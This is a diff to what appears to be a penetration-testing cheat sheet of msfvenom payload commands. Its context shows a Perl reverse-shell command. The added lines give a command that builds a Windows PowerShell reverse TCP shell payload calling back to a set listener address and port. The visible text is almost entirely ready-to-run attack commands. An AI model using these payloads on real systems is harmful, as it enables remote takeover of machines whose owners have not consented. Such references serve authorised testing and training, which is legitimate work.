@@ -74,6 +74,12 @@ Perl
 msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
 ```
 
+PowerShell
+
+```text
+msfvenom -p windows/x64/powershell_reverse_tcp -o psh.ps1 -a x64 --platform windows LHOST=192.168.88.251 LPORT=8080
+```
+
 ## Memory Corruption Payloads
 
 Creating a msfvenom payload with an encoder while removing bad characters:
